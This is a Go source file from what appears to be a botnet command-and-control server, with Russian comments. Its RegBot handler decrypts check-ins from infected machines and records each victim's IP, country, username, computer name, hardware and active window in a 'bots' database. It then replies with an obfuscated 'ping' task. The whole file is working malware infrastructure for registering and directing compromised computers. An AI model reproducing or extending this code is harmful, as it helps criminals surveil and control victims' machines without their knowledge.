package reg

import (
	"log"
	"net/http"
	"strings"

	database "../../../db"
	utils "../../../utils"
	obf "../obf"

	"github.com/gin-gonic/gin"
	"github.com/ip2location/ip2location-go"
)

var db = database.Connect()

/*
	Функция возвращает код страны бота
*/
func GetCountry(ip string) string {
	db, err := ip2location.OpenDB("./dump/ip2country.bin")
	if err != nil {
		log.Println("reg.GetCountry: ", err)
		return "UNK"
	}
	results, err := db.Get_all(ip)
	country := results.Country_short
	db.Close()

	if country == "-" {
		return "UNK"
	}

	return results.Country_short
}

/*
	Регистрация бота в БД.
*/
func RegBot(ctx *gin.Context) {
	data_enc := ctx.PostForm("data")
	data := strings.Split(obf.Decrypt(data_enc), "|")
	// мы ожидаем от бота uid, версию ОС, юзернейм, имя компютера, название проца, название видюхи,
	// кол-во озу, разрешение экрана, текущее активное окно.
	// Если бот что-то не выслал - просим его снова выслать данные о себе
	if len(data) < 9 {
		ctx.String(http.StatusOK, obf.Encrypt("reg|"))
		return
	}
	// получаем айпи бота
	botIp := ctx.ClientIP()
	_, err := db.Exec("INSERT INTO `bots` (`Uid`, `Ip`, `Country`, `WinVer`, `Username`, `Computername`, `CpuName`, `GpuName`, `RamAmount`, `ScreenResolution`, `ActiveWindow`, `Joined`, `Seen`, `TaskId`) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
		data[0],
		botIp,
		GetCountry(botIp),
		data[1],
		data[2],
		data[3],
		data[4],
		data[5],
		data[6],
		data[7],
		data[8],
		utils.GetTimeStamp(),
		utils.GetTimeStamp(),
		0,
	)
	if err != nil {
		log.Println("reg.RegBot:", err)
	}

	// отправляем бота пинговать
	ctx.String(http.StatusOK, obf.Encrypt("ping|"))
}
